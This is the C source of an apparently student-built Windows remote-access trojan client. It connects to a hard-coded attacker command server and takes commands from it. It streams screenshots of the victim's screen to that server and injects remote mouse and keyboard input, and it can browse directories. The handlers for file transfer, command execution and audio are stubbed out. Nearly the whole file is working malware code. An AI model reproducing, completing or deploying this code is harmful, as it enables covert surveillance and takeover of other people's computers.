#define _WINSOCK_DEPRECATED_NO_WARNINGS // TODO - fix this
#define WINVER 0x0500 // required to use SendInput() function

#include <winsock2.h> // windows socket header
#include <shlwapi.h> // useful functions for directory traversal
#include <stdio.h> // standard input/output
#include <string.h> // useful string functions
#include <windows.h> // might already by included from other includes

#pragma comment(lib,"ws2_32.lib") // tell the linker to link the winsock library
#pragma comment(lib, "Shlwapi.lib")

// attacker IP and primary communication port
//#define CMD_SERVER_ADDR "127.0.0.1"
#define CMD_SERVER_ADDR "192.168.56.1"
#define CMD_SERVER_PORT 8080
#define VIDEO_PORT 8081
#define INPUT_PORT 8082

// change directory and list directory contents
#define CHANGE_DIR 1
#define LIST_DIR 2
// upload and download files (from attacker's perspective)
#define UPLOAD 3
#define DOWNLOAD 4
// run an arbitrary comamnd
#define RUN_CMD 5
// start and end video, mouse, and audio streams
#define START_VIDEO 6
#define END_VIDEO 7
#define START_MOUSE 8
#define END_MOUSE 9
#define START_AUDIO 10
#define END_AUDIO 11
#define START_KEYS 13
#define END_KEYS 14
// end the process
#define KILL_PROC 12
// print the rest of the message to provide useful info
#define PRINT_INFO 15
// inform the attacker what the current directory is
#define NEW_CURR_DIR 16
// constants for controlling the mouseand keyboard
#define MOUSE_POS 17 /* this will be followed by X, Y coords for the mouse */
#define MOUSE_DOWN 18 /* this will be followed by MOUSE_LEFT, MOUSE_RIGHT, or MOUSE_MIDDLE */
#define MOUSE_UP 19 /* same as MOUSE_DOWN */
#define MOUSE_LEFT 20
#define MOUSE_RIGHT 21
#define MOUSE_MIDDLE 22
#define MOUSE_WHEEL 23 /* this will be followed by a number to specify the scroll amount */
#define KEY_DOWN 24 /* this will be followed by a Windows virtual-key code */
#define KEY_UP 25 /* same as KEY_DOWN */
#define START_INPUT 26 /* tell the C client to simulate inputs from a list of all input events since last frame */
#define CONT_INPUT 27 /* tell the C client there's more input - ends with null terminator */

// define useful globals
char currDir[MAX_PATH]; // name of the current directory
SOCKET mainSock; // main socket used to receive commands and send info
SOCKET videoSock; // socket used to send video data to attacker server
SOCKET inputSock; // socket used to receive keyboard/mouse input from attacker
int videoOn = 0; // boolean for whether the video stream is running
HANDLE videoThread; // handle for thread that sends video to attacker
HANDLE inputThread; // handle for thread that gets input stream from attacker
int mouseControl = 0; // flag for if mouse is being controlled
int keyboardControl = 0; // flag for if keyboard is being controlled

DWORD WINAPI test(void* data);
void connectToVideo();
void connectToInput();

// helper function for exiting on error
void exitOnError() {
	printf("Exiting program...\n");
	exit(1);
}

// helper function to send info messages to the attacker server
// "code" is the #DEFINE associated with the data being sent
// assumes that the string passed has a null-terminator
// TODO - won't always correctly send non-string data
void sendData(char code, char* data) {
	printf("Sending data to attacker server...\n");
	// init local vars
	int bytesToSend = strlen(data) + 1; // length of data + null terminator + 1 byte for PRINT_INFO code
	char* buff = (char*)malloc(bytesToSend);
	int bytesSent = 0;
	int retCode;
	int repeats = 0;
	// set up the buffer for the first try of sending data
	buff[0] = code;
	memcpy((char*)(buff + 1), data, strlen(data));

	// loop until all data is sent
	do {
		retCode = send(mainSock, buff, bytesToSend - bytesSent, 0);
		if (retCode == SOCKET_ERROR) {
			printf("Could not send data: %d\n", WSAGetLastError());
			exitOnError();
		}
		bytesSent += retCode;
		if (bytesSent < bytesToSend) { // we need to loop again
			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
			memmove((char*)(buff + 1), (char*)(buff + bytesSent), bytesToSend - retCode);
			repeats++;
		}
	} while (bytesSent < bytesToSend + repeats);
	printf("Data has been sent!\n");
	printf("%s\n", buff);
	free(buff);
}

/*
* Change the current directory - used for directory traversal
* All file and directory related commands will use the current directory as the default location
*/
void changeDirectory(char* dirName) {
	int newLen = strnlen(dirName, 4096);
	int currLen = strnlen(currDir, MAX_PATH);
	char buff[MAX_PATH];
	// check the new path length
	if (newLen + currLen + 1 > MAX_PATH) {
		sendData(PRINT_INFO, "Path name is too long!\n\0");
		return;
	}
	// change any '/' to be '\'
	for (int i = 0; i < MAX_PATH; i++) {
		if (dirName[i] == '/') {
			dirName[i] = '\\'; }
	}
	// concatenate the strings and check if it's a valid directory
	memcpy(buff, currDir, MAX_PATH);
	strcat_s(buff, MAX_PATH, "\\");
	strcat_s(buff, MAX_PATH, dirName);
	printf("Checking if \"%s\" is a directory...\n", buff);
	if (PathIsDirectoryA(buff)) {
		if (!PathCanonicalizeA(currDir, buff)) {
			printf("Failed to canonicalize path name \"%s\" with error %d\n\0", buff, GetLastError());
		} else {
			printf("Directory exists!\n");
			sendData(NEW_CURR_DIR, currDir);
		}
	} else {
		sendData(PRINT_INFO, "Directory does not exist!\n\0");
	}
}

/*
* List the contents of the current directory
* TODO - handle optional argument for directory to list contents of
*/
void listDirectoryContents() {
	HANDLE findHandle;
	WIN32_FIND_DATAA fileData;
	char searchPath[MAX_PATH];

	// build the search path with a simple copy + concat
	memcpy(searchPath, currDir, MAX_PATH);
	strcat_s(searchPath, MAX_PATH, "\\*.*");
	printf("Listing directory contents using search path: %s\n", searchPath);

	// get the first result
	findHandle = FindFirstFileA(searchPath, &fileData);
	if (findHandle == INVALID_HANDLE_VALUE) {
		printf("Error when attempting to find first file: %d\n", GetLastError());
		return;
	}
	sendData(PRINT_INFO, ""); // formatting on attacker side

	// loop through the rest of the files
	do {
		sendData(PRINT_INFO, fileData.cFileName);
	} while (FindNextFileA(findHandle, &fileData));

	// check the exit error code
	DWORD e = GetLastError();
	if (e != ERROR_NO_MORE_FILES) {
		printf("Error when attempting to find next file: %d\n", e); }

	// close the handle and return
	FindClose(findHandle);
}

/*
* Helper function to check if KEYEVENTF_EXTENDEDKEY needs to be set for a given virtual-key code 
* The following is pulled from the MSDN documentation:
* 
* The extended-key flag indicates whether the keystroke message originated from one of the 
* additional keys on the enhanced keyboard. The extended keys consist of the ALT and
* CTRL keys on the right-hand side of the keyboard; the INS, DEL, HOME, END, PAGE UP, PAGE DOWN,
* and arrow keys in the clusters to the left of the numeric keypad; the NUM LOCK key; 
* the BREAK (CTRL+PAUSE) key; the PRINT SCRN key; and the divide (/) and 
* ENTER keys in the numeric keypad. The extended-key flag is set if the key is an extended key.
*/
DWORD isExtendedKey (WORD code) {
	switch(code)
	{
		// from stackoverflow: VK_UP, VK_DOWN, VK_LEFT, VK_RIGHT, VK_HOME, VK_END, VK_PRIOR, VK_NEXT, VK_INSERT, VK_DELETE
		case VK_RMENU:
		case VK_RCONTROL:
		case VK_INSERT:
		case VK_DELETE:
		case VK_HOME:
		case VK_END:
		case VK_PRIOR:
		case VK_NEXT:
		case VK_LEFT:
		case VK_RIGHT:
		case VK_UP:
		case VK_DOWN:
			return KEYEVENTF_EXTENDEDKEY;
		default:
			return 0;
	}
}

/*
* Process input stream sent from command server
* Send inputs to OS if keyboard and/or mouse control is enabled
*/
void processInputStream(char* buffer) {
	// locals used for processing stuff
	int idx = 0;
	int prev = 0; // used for debug with infinite loops
	char cmd;
	// main loop - this always passes the first time
	do {
		prev = idx;
		cmd = buffer[idx + 1];
		printf("Processing cmd: %d\n", cmd);
		printf("Key and mouse control: %d, %d\n", keyboardControl, mouseControl);
		if (mouseControl == 1) {
			// assume we will be sending a mouse input cand create the INPUT structure
			// this shouldn't be that big of a time waste if we don't send an input
			INPUT in;
			in.type = INPUT_MOUSE;
			// could change to keep X and Y constant between each MOUSE_POS event
			in.mi.dx = 0;
			in.mi.dy = 0;
			in.mi.mouseData = 0;
			in.mi.time = 0;
			in.mi.dwExtraInfo = 0;
			if (cmd == MOUSE_DOWN) { // mouse click
				printf("mouse down\n");
				char button = buffer[idx + 2];
				if (button == MOUSE_LEFT) {
					in.mi.dwFlags = MOUSEEVENTF_LEFTDOWN;
				} else if (button == MOUSE_MIDDLE) {
					in.mi.dwFlags = MOUSEEVENTF_MIDDLEDOWN;
				} else if (button == MOUSE_RIGHT) {
					in.mi.dwFlags = MOUSEEVENTF_RIGHTDOWN;
				}
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting mouse down into input stream: %d\n", GetLastError());
				}
				idx += 3;
			} else if (cmd == MOUSE_UP) { // mouse release
				printf("mouse up\n");
				char button = buffer[idx + 2];
				if (button == MOUSE_LEFT) {
					in.mi.dwFlags = MOUSEEVENTF_LEFTUP;
				}
				else if (button == MOUSE_MIDDLE) {
					in.mi.dwFlags = MOUSEEVENTF_MIDDLEUP;
				}
				else if (button == MOUSE_RIGHT) {
					in.mi.dwFlags = MOUSEEVENTF_RIGHTUP;
				}
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting mouse up into input stream: %d\n", GetLastError());
				}
				idx += 3;
			} else if (cmd == MOUSE_WHEEL) { // mouse wheel scrolled
				printf("mouse wheel\n");
				in.mi.dwFlags = MOUSEEVENTF_WHEEL;
				char amount = buffer[idx + 2];
				if(amount == 0) { // was it a negative scroll amount?
					in.mi.mouseData = buffer[idx + 3] * -1;
					idx += 4;
				} else {
					in.mi.mouseData = amount;
					idx += 3;
				}
				in.mi.mouseData *= 120; // MOUSE_DELTA = 120
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting mouse wheel into input stream: %d\n", GetLastError());
				}
			} else if (cmd == MOUSE_POS) { // mouse move event
				printf("mouse pos\n");
				in.mi.dwFlags = MOUSEEVENTF_ABSOLUTE | MOUSEEVENTF_MOVE;
				int * ref = &buffer[idx + 2];
				in.mi.dx = ntohl(ref[0]);
				in.mi.dy = ntohl(ref[1]);
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting mouse move into input stream: %d\n", GetLastError());
				}
				idx += 10;
			}
		}
		if (keyboardControl == 1) {
			// assume we will be sending a key input and create the INPUT structure
			// this shouldn't be that big of a time waste if we don't send an input
			INPUT in; // INPUT structure to send
			in.type = INPUT_KEYBOARD; // this is a keyboard input
			in.ki.wScan = 0; // not using the scan code
			in.ki.time = 0; // let the system generate a timestamp
			in.ki.dwExtraInfo = 0; // no extra info to send
			in.ki.wVk = buffer[idx + 2]; // set the virtual key-code to what we received
			DWORD extendedFlag = isExtendedKey(in.ki.wVk);
			// check if we're sending an input, and whether that input is a key press or key release
			if (cmd == KEY_DOWN) {
				printf("Pressing %x\n", (unsigned char)buffer[idx + 2]);
				in.ki.dwFlags = extendedFlag; // no flags (0) for key press
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting key press into input stream: %d\n", GetLastError()); }
				idx += 3;
			} else if (cmd == KEY_UP) {
				printf("Releasing %x\n", (unsigned char)buffer[idx + 2]);
				in.ki.dwFlags = KEYEVENTF_KEYUP | extendedFlag; // KEYEVENTF_KEYUP for key release
				if (SendInput(1, &in, sizeof(INPUT)) == 0) {
					printf("Error inserting key release into input stream: %d\n", GetLastError()); }
				idx += 3;
			}
		}
		//printf("Buffer[%d] = %d\n", idx, buffer[idx]);
	} while(buffer[idx] == CONT_INPUT && prev != idx);
	// DEBUG
	/*
	if (prev == idx) {
		printf("Broke out of infinite loop!\n");
	}
	printf("Processed buffer + 10:");
	for (int i=0; i<idx + 10; i++) {
		printf(" %x", (unsigned char)buffer[i]);
		if (i == idx) {
			printf(" |");
		}
	}
	printf("\n");
	*/
}

/*
* Get buffer for input control
*/
DWORD WINAPI inputLoop(void* data) {
	// local vars
	char buffer[4096];
	int retCode;
	// get and process commands from the attacker
	while(mouseControl == 1 || keyboardControl == 1) {
		// get the next command and check for errors or a closed connection
		ZeroMemory(buffer, 4096);
		retCode = recv(inputSock, buffer, 4096, 0);
		if (retCode == 0) {
			printf("Connection closed...\nStopping input loop...\n");
			mouseControl = 0;
			keyboardControl = 0;
		}
		else if (retCode < 0) {
			printf("Input recv failed with error: %d\n", WSAGetLastError());
			mouseControl = 0;
			keyboardControl = 0;
		}
		// if we got this far, we have a valid message to process
		processInputStream(buffer);
	}
	// close the socket
	if (closesocket(inputSock) == SOCKET_ERROR) {
		printf("Error closing input sock: %d\n", WSAGetLastError());
	}
	return 0;
}

/*
* Handle commands from the attacker server
* Return the #DEFINE associated with the command
*/
char handleCommand(char* buffer) {
	// get the command sent
	char cmd = buffer[0];
	// check what the command was and call the appropriate function
	if (cmd == CHANGE_DIR) { // TODO - complete this later as QoL feature
		printf("Changing directory...\n");
		// shift the buffer left by one to get just the name of the directory to change to
		for (int i = 1; i < 4096 && buffer[i-1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Changing to directory %s\n", buffer);
		changeDirectory(buffer);
	} else if (cmd == LIST_DIR) { // TODO - complete this later as QoL feature
		printf("Listing directoy contents\n");
		listDirectoryContents();
	} else if (cmd == DOWNLOAD) {
		printf("Uploading file to controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i]; }
		printf("Uploading file %s on port %d\n", buffer, port);
		//uploadFile(port, buffer);
	} else if (cmd == UPLOAD) {
		printf("Downloading file from controller\n");
		// get the port to connect to then shift the buffer to be just the file name
		int port = (buffer[1] * 256) + buffer[2];
		for (int i = 3; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 3] = buffer[i];
		}
		printf("Downloading file %s on port %d\n", buffer, port);
		//downloadFile(port, buffer);
	} else if (cmd == RUN_CMD) {
		printf("Running command prompt arguments...\n");
		// shift the buffer left by one to get just command and its arguments
		for (int i = 1; i < 4096 && buffer[i - 1] != '\0'; i++) {
			buffer[i - 1] = buffer[i]; }
		printf("Running \"%s\" from command prompt\n", buffer);
		//runCommandPrompt(buffer);
	} else if (cmd == START_VIDEO) {
		if (videoOn == 0) {
			printf("Starting video stream...\n");
			// get the port to connect to
			//int port = (buffer[1] * 256) + buffer[2];
			printf("Streaming video to attacker on port %d\n", VIDEO_PORT);
			connectToVideo();
			videoOn = 1;
			videoThread = CreateThread(NULL, 0, test, NULL, 0, NULL);
			//streamVideo(port);
		}
		else {
			printf("Video already streaming\n");
		}
	} else if (cmd == END_VIDEO) {
		videoOn = 0;
	} else if (cmd == START_MOUSE) {
		printf("Mouse is being controlled\n");
		mouseControl = 1;
		if (inputThread != NULL) {
			DWORD ret;
			if (!GetExitCodeThread(inputThread, &ret)) {
				printf("Error checking input thread's state: %d\n", GetLastError());
				return;
			}
			if (ret != STILL_ACTIVE) {
				connectToInput();
				inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
			}
		} else {
			connectToInput();
			inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
		}
		// get the port to connect to
		//int port = (buffer[1] * 256) + buffer[2];
		//printf("Attacker is controlling mouse from port %d\n", port);
		//controlMouse(port);
	} else if (cmd == END_MOUSE) {
		printf("Mouse has been released\n");
		mouseControl = 0;
		// TODO - determine how best to stop mouse control
	} else if (cmd == START_AUDIO) {
		printf("Starting audio stream...\n");
		// get the port to connect to
		int port = (buffer[1] * 256) + buffer[2];
		printf("Streaming audio to attacker on port %d\n", port);
		//streamAudio(port);
	} else if (cmd == END_AUDIO) {
		// TODO - determine how best to stop audio stream
	} else if (cmd == START_KEYS) {
		printf("Keyboard is being controlled\n");
		keyboardControl = 1;
		if (inputThread != NULL) {
			DWORD ret;
			if (!GetExitCodeThread(inputThread, &ret)) {
				printf("Error checking input thread's state: %d\n", GetLastError());
				return;
			}
			if (ret != STILL_ACTIVE) {
				connectToInput();
				inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
			}
		} else {
			connectToInput();
			inputThread = CreateThread(NULL, 0, inputLoop, NULL, 0, NULL);
		}
		// get the port to connect to
		//int port = (buffer[1] * 256) + buffer[2];
		//printf("Attacker is controlling keyboard from port %d\n", port);
		//controlKeyboard(port);
	} else if (cmd == END_KEYS) {
		// TODO - determine how best to stop keyboard control
		printf("Keyboard has been released\n");
		keyboardControl = 0;
	} else if (cmd == KILL_PROC) {
		printf("Ending process...\n");
	} else if (cmd == START_INPUT) {
		processInputStream(buffer);
	} else {
		printf("Unknown command received: %d\n", cmd);
	}
	return cmd;
}

/*
* Connect to the primary command server
* This is where we'll get the commands to do stuff
* Secondary connections will be set up for streaming other data
*/
void connectToCommandServer() {
	struct sockaddr_in server;
	int retCode;
	char cmd;
	char buffer[4096];

	// create the TCP socket
	mainSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (mainSock == INVALID_SOCKET) {
		printf("Could not create socket: %d\n", WSAGetLastError());
		exitOnError();
	}

	// set the server info structure
	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(CMD_SERVER_PORT);

	// connect to the attacker command server
	if (connect(mainSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
		printf("Could not connect to command server! Error code: %d\n", WSAGetLastError());
		exitOnError();
	} else {
		printf("Connected to command server\n");
	}

	// get and process commands from the attacker
	do {
		// get the next command and check for errors or a closed connection
		ZeroMemory(buffer, 4096);
		retCode = recv(mainSock, buffer, 4096, 0);
		if (retCode == 0) {
			printf("Connection closed...\nExiting program...\n");
			return 0;
		} else if (retCode < 0) {
			printf("Recv failed with error: %d\n", WSAGetLastError());
			exitOnError();
		}
		// if we got this far, we have a valid message to process
		cmd = handleCommand(buffer);
	} while (cmd != KILL_PROC);

	// TODO - kill the connection gracefully
}

/*
* Connect to the video socket
*/
void connectToVideo() {
	struct sockaddr_in server;

	// create the TCP socket
	videoSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (videoSock == INVALID_SOCKET) {
		printf("Could not create video socket: %d\n", WSAGetLastError());
		return;
	}

	// set the server info structure
	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(VIDEO_PORT);

	// connect to the attacker command server
	if (connect(videoSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
		printf("Could not connect to video server! Error code: %d\n", WSAGetLastError());
		return;
	}
	else {
		printf("Connected to video server\n");
	}
}

/*
* Connect to the input stream
*/
void connectToInput() {
	struct sockaddr_in server;
	printf("Connecting to input server\n");

	// create the TCP socket
	inputSock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (inputSock == INVALID_SOCKET) {
		printf("Could not create input socket: %d\n", WSAGetLastError());
		return;
	}

	// set the server info structure
	server.sin_addr.s_addr = inet_addr(CMD_SERVER_ADDR);
	server.sin_family = AF_INET;
	server.sin_port = htons(INPUT_PORT);

	// connect to the attacker command server
	if (connect(inputSock, (struct sockaddr*)&server, sizeof(server)) != 0) {
		printf("Could not connect to input server! Error code: %d\n", WSAGetLastError());
		return;
	}
	else {
		printf("Connected to input server\n");
	}
}

// TODO - remove once done using
int frames = 0;
void videoStreamTest() {
	// code modified from https://stackoverflow.com/questions/3291167/how-can-i-take-a-screenshot-in-a-windows-application
	// get the device context of the screen
	// DC contains drawing info
	// technically a handle to a DC cuz the system hides everything from us
	// once done using, call ReleaseDC(NULL, hScreenDC)
	HDC hScreenDC = GetDC(NULL);
	// and a device context to put it in
	// a "memory DC" exists only in memory
	// need to select a bitmap into the DC before it can be used
	// this is done using CreateCompatibleBitmap()
	// this specified the height, width, and color organization
	// use DeleteDC to get rig of the DC once done using it
	HDC hMemoryDC = CreateCompatibleDC(hScreenDC);

	// after ~5000 frames, this value drops to a massive negative number
	// the 2's complement hex of this number is CCCCCCCC
	int width = GetDeviceCaps(hScreenDC, HORZRES);
	int height = GetDeviceCaps(hScreenDC, VERTRES);

	// create a bitmap compatible with the screen HDC
	// we can specify the width and height of the bitmap
	// since this is for the screen, we use the screen width and height
	// the color format/organization is selected automatically to match the screen DC
	// the bitmap is "selected into" the screen DC
	// delete this bitmap with DeleteObject() once done using it
	HBITMAP hBitmap = CreateCompatibleBitmap(hScreenDC, width, height);

	// select the screen-compitable bitmap into the memory DC
	// this will allow us to use the memory DC
	// the new bitmap returned replaces the old bitmap
	// if an error occurs, this function return NULL (might want to check for that)
	// might want to delete this bitmap once we're done using it?
	HBITMAP holdBitmap = (HBITMAP)SelectObject(hMemoryDC, hBitmap);

	// do a bit blit from the screen DC to the memory DC
	if (!BitBlt(hMemoryDC, 0, 0, width, height, hScreenDC, 0, 0, SRCCOPY)) {
		printf("Error: %d\n", GetLastError());
	}

	// draw the mouse cursor onto the image
	// modified from https://stackoverflow.com/questions/1628919/capture-screen-shot-with-mouse-cursor
	CURSORINFO cursor;
	cursor.cbSize = sizeof(CURSORINFO);
	if (!GetCursorInfo(&cursor)) {
		printf("Error getting cursor info: %d\n", GetLastError());
		return;
	}
	if (cursor.flags == CURSOR_SHOWING) {
		ICONINFOEXA info;
		info.cbSize = sizeof(ICONINFOEXA);
		GetIconInfoExA(cursor.hCursor, &info);
		int x = cursor.ptScreenPos.x - info.xHotspot;
		int y = cursor.ptScreenPos.y - info.yHotspot;
		BITMAP bmpCursor;
		bmpCursor.bmType = 0;
		GetObject(info.hbmColor, sizeof(bmpCursor), &bmpCursor);
		DrawIconEx(hMemoryDC, x, y, cursor.hCursor, bmpCursor.bmWidth, bmpCursor.bmHeight,
			0, NULL, DI_NORMAL);
	}

	// pull the bitmap out of the HDC memory
	hBitmap = (HBITMAP)SelectObject(hMemoryDC, holdBitmap);

	// clean up
	DeleteDC(hMemoryDC);
	DeleteDC(hScreenDC);
	if (!DeleteObject(holdBitmap)) { // do we want to delete this???
		printf("Could not delete holBitmap\n");
	}

	// now your image is held in hBitmap. You can save it or do whatever with it
	
	// code from https://stackoverflow.com/questions/22572849/c-how-to-send-hbitmap-over-socket
	BITMAP Bmp;
	BITMAPINFO Info;
	HDC DC = CreateCompatibleDC(NULL);
	HBITMAP OldBitmap = (HBITMAP)SelectObject(DC, hBitmap);
	GetObject(hBitmap, sizeof(Bmp), &Bmp);

	Info.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
	Info.bmiHeader.biWidth = width = Bmp.bmWidth;
	Info.bmiHeader.biHeight = height = Bmp.bmHeight;
	Info.bmiHeader.biPlanes = 1;
	Info.bmiHeader.biBitCount = Bmp.bmBitsPixel;
	Info.bmiHeader.biCompression = BI_RGB;
	int fileSize = ((width * Bmp.bmBitsPixel + 31) / 32) * 4 * height;
	Info.bmiHeader.biSizeImage = fileSize;

	char * Pixels = malloc(Info.bmiHeader.biSizeImage);
	char * pRev = malloc(Info.bmiHeader.biSizeImage);
	GetDIBits(DC, hBitmap, 0, height, &Pixels[0], &Info, DIB_RGB_COLORS);
	SelectObject(DC, OldBitmap);
	//height = height < 0 ? -height : height;
	DeleteDC(DC);
	
	// send data
	int bytesToSend = fileSize;
	int bytesSent = 0;
	int retCode;
	int repeats = 0;

	// send frame info (width, height, size) before frame data
	int buff[3];
	buff[0] = htonl(width);
	buff[1] = htonl(height);
	buff[2] = htonl(fileSize);
	retCode = send(videoSock, buff, 12, 0);
	if (retCode == SOCKET_ERROR) {
		printf("Could not send data: %d\n", WSAGetLastError());
		return;
	}

	// print the size of the bitmap for the current frame - used for debug
	//printf("Frame %d x & y: %d x %d\n", frames++, width, height);

	// vertically flip the image - just something with how the screen capture works
	for (int row = 0; row < height; row++) {
		for (int b = 0; b < width * 4; b++) {
			int idx = ((height - row - 1) * width * 4) + b;
			int rIdx = (row * width * 4) + b;
			pRev[rIdx] = Pixels[idx];
		}
	}

	// swap the red and blue bytes (seems to be a problem on this side)
	// TODO - why exactly does this happen???
	for (int i = 0; i < fileSize; i += 4) {
		char temp = pRev[i];
		pRev[i] = pRev[i + 2];
		pRev[i + 2] = temp;
	}

	// loop until all data is sent
	do {
		retCode = send(videoSock, pRev, bytesToSend - bytesSent, 0);
		if (retCode == SOCKET_ERROR) {
			printf("Could not send data: %d\n", WSAGetLastError());
			return;
		}
		bytesSent += retCode;
		if (bytesSent < bytesToSend) { // we need to loop again
			printf("Could not send all data in one attempt! Looping to send remaining data...\n");
			memmove(Pixels, (char*)(pRev + bytesSent), bytesToSend - retCode);
			repeats++;
		}
	} while (bytesSent < bytesToSend + repeats);

	free(Pixels);
	free(pRev);
	if (!DeleteObject(hBitmap)) { // do we want to delete this???
		printf("Could not delete hBitmap\n");
	}
}

// TODO - remove testing function once no longer needed
// currently testing video streaming to attacker server
DWORD WINAPI test(void* data) {
	while (videoOn == 1) {
		videoStreamTest();
		Sleep(33);
	}
}

int main(int argc, char* argv[]) {
	WSADATA wsa;
	// initialize winsock
	int retCode = WSAStartup(MAKEWORD(2, 2), &wsa);
	if (retCode != 0) {
		printf("WSAStartup failed with error: %d\n", retCode);
		exitOnError();
	}
	// get the current directory
	GetModuleFileNameA(NULL, currDir, MAX_PATH);
	for (int i = MAX_PATH - 1; i >= 0; i--) {
		if (currDir[i] == '\\' || currDir[i] == '/') {
			currDir[i] = '\0';
			break;
		}
		currDir[i] = '\0';
	}
	printf("Running from \"%s\"\n", currDir);
	// connect to the command server
	connectToCommandServer();
	return 0;
}